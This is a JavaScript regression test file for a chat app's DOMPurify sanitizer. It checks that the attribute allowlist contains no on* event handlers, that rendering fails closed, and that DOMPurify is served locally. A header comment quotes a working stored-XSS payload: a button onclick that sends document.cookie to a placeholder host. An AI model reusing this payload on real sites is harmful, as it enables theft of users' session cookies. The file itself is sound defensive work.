// tests/unit/chatSanitizerXss.test.js
//
// Regression guard for a stored DOM XSS in the chat message renderer.
//
// public/js/script.js sanitizes every rendered message with DOMPurify, but its
// ALLOWED_ATTR list included 'oninput' and 'onclick'. DOMPurify does NOT
// special-case on* handlers: whitelisting them whitelists arbitrary JavaScript,
// and its URI check happily passes a value like "alert(1)". Confirmed by running
// the installed DOMPurify against the exact config — the payload
//
//   <button onclick="fetch('https://x/?c='+document.cookie)">solve</button>
//
// came back byte-identical. Student messages render through the same path as
// tutor output, and history is re-rendered on every conversation load, so a
// student could type that into the chat box and have it stored and re-fire every
// session.
//
// These assertions are static: they parse the real allowlist out of script.js
// rather than executing DOMPurify, because driving DOMPurify needs a DOM and
// jest-environment-jsdom is not a dependency of this repo. That is sufficient
// for the regression this guards — the defect WAS the allowlist entry, so the
// test fails the moment an on* attribute reappears.

const fs = require('fs');
const path = require('path');

const readPublic = (rel) =>
    fs.readFileSync(path.join(__dirname, '../../public', rel), 'utf8');

const source = readPublic('js/script.js');

/** Pull a live ALLOWED_* array out of script.js, ignoring // comments. */
function extractList(name) {
    const start = source.indexOf(`${name}: [`);
    if (start === -1) throw new Error(`${name} not found in script.js`);
    const open = source.indexOf('[', start);
    let depth = 0;
    let end = -1;
    for (let i = open; i < source.length; i++) {
        if (source[i] === '[') depth++;
        else if (source[i] === ']') {
            depth--;
            if (depth === 0) { end = i + 1; break; }
        }
    }
    if (end === -1) throw new Error(`${name} array never closed`);
    const body = source.slice(open, end).replace(/\/\/[^\n]*/g, '');
    return [...body.matchAll(/'([^']+)'/g)].map((m) => m[1]);
}

const ALLOWED_ATTR = extractList('ALLOWED_ATTR');
const ALLOWED_TAGS = extractList('ALLOWED_TAGS');

describe('chat sanitizer allowlist', () => {
    test('sanity: the allowlist was actually parsed', () => {
        expect(ALLOWED_ATTR.length).toBeGreaterThan(10);
        expect(ALLOWED_TAGS.length).toBeGreaterThan(10);
    });

    test('permits no on* event-handler attributes', () => {
        // The defect. Never add one back: DOMPurify will pass arbitrary JS through.
        expect(ALLOWED_ATTR.filter((a) => /^on/i.test(a))).toEqual([]);
    });

    test('permits no script-bearing tags', () => {
        ['script', 'iframe', 'object', 'embed', 'form'].forEach((tag) => {
            expect(ALLOWED_TAGS).not.toContain(tag);
        });
    });

    test('still allows what interactive visuals need', () => {
        // Guards the opposite failure: over-correcting and silently breaking
        // sliders and graphs.
        ['class', 'id', 'style', 'type', 'min', 'max', 'value', 'step', 'data-config']
            .forEach((attr) => expect(ALLOWED_ATTR).toContain(attr));
    });
});

describe('sanitizer fails closed', () => {
    test('renderMarkdownMath renders text, not markup, when DOMPurify is absent', () => {
        // It previously fell through and returned RAW html. Not a theoretical
        // branch: DOMPurify was loaded from a CDN, and district content filters
        // routinely block CDN hosts — a blocked sanitizer meant every message
        // rendered unsanitized.
        const guardAt = source.indexOf('if (!_DOMPurify)');
        expect(guardAt).toBeGreaterThan(-1);
        expect(source.slice(guardAt, guardAt + 400)).toContain('textContent');
    });

    test('DOMPurify is served locally, not from a third-party CDN', () => {
        // Vendored so a blocked CDN cannot disable sanitization, and so the
        // client stops running an older DOMPurify than the server.
        ['chat.html', 'index.html', 'parent-dashboard.html', 'parent-course.html']
            .forEach((page) => {
                const html = readPublic(page);
                expect(html).not.toMatch(/cdn\.jsdelivr\.net\/npm\/dompurify/);
                expect(html).toContain('/vendor/dompurify/purify.min.js');
            });
    });
});

describe('interactive visuals do not depend on stripped inline handlers', () => {
    const visuals = readPublic('js/inlineChatVisuals.js');

    // Every control rendered into a sanitized message must be bound with
    // addEventListener in initializeVisuals(), because its inline onclick is
    // removed by the sanitizer before it ever reaches the DOM. '.icv-to-workspace'
    // was the one control that had no programmatic binding.
    ['.icv-zoom-in', '.icv-zoom-out', '.icv-reset', '.icv-to-workspace', '.icv-collapsed']
        .forEach((sel) => {
            test(`${sel} is bound with addEventListener`, () => {
                // Some are located with querySelector, some with querySelectorAll.
                expect(visuals).toMatch(
                    new RegExp(`querySelector(?:All)?\\('${sel.replace('.', '\\.')}'\\)`)
                );
            });
        });
});
